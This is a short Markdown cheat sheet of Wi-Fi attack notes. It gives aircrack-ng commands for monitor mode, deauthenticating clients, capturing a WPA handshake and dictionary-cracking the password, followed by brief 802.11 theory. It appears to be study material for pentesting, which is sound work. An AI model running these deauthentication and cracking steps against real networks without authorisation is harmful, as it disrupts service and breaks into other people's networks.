# Wifi

## Tools

### aircrack-ng (manual)

#### Eliminate processes that prevent putting the monitor mode

```aitmon-ng check kill```

#### Discovering Wifi Networks

- Put the indicated network card in monitor mode

```airmon-ng start [interface-name]```

- Search networks

```airodump-ng [interface-name-monitori-mode]```

#### Snifing trafic

- Only sniff traffic from an AP

```airodump-ng -c1 --bssid [BSSID]```

#### Deautenticate Atack

- Configuration of the card in the wiffi network channel to deauthenticate

```iwconfig [interface-name-monitori-mode] channel [nº-wifi-to-desauth]```

- Deauthentication attack against the entire network

```aireplay-ng --deauth [nº-paqutes(50)] -a [BBID-to-hack] [interface-name-monitori-mode]```

#### Capture handshake

- Packet sniffing of a specific AP and stored in a file

```airodump-ng -c [nº-wifi-to-desauth] --bssid [BBID-to-hack] -w [file-to-save] [interface-name-monitori-mode]```

- Processs:
	1º Deautenticar AP 
	2º Whait until reconecting
	3º The password is stored encrypted in the specified file
			
#### Crack Pasword

- Password cracking using dictionary from handshake capture

```aircrack-ng -w [path-dictionary] -b [BBID-to-hack] [captura.pcap]```

-  airgeddon (Automatic)
	Download from [github](https://github.com/v1s1t0r1sh3r3/airgeddon)

## Teoria

Standar Wifi 802.11

### SSID: 

Transmitted on all packets in the network segment

Is public

### BSSID

Is de BSSID of had-doc networks

### ESSID

Is de SSID of de AP networks

### Functions modes

AP or Infraestructure:

WDS (Wireless Distribution System)

WDS con AP

Repeater (Ranger Extender)

Wireless Client

### Deteccion de Redes

Using  Beacoms Frames:

-  Periodically transmitted packets containing MAC and SSID

Channel exploration

Creation of available listings

### Paquetes

Administrative ramework

- Maintain communication between APs and wireless clients
- Auth
- Association Resquest
- Assosiation Respones
- Beacoms

Probe Request

Control framework: They guarantee the proper exchange between AP and clients

- Request to Sender (RTS) => Shipping request
- Clear to Send ()CTS => Free to send
- ACK => Confirmation

Data framework: They transport the real data of the established communication

### Autentications types

Open

Shae Key:

- WEB
- WPA-PSK
- WPA2-PSK
		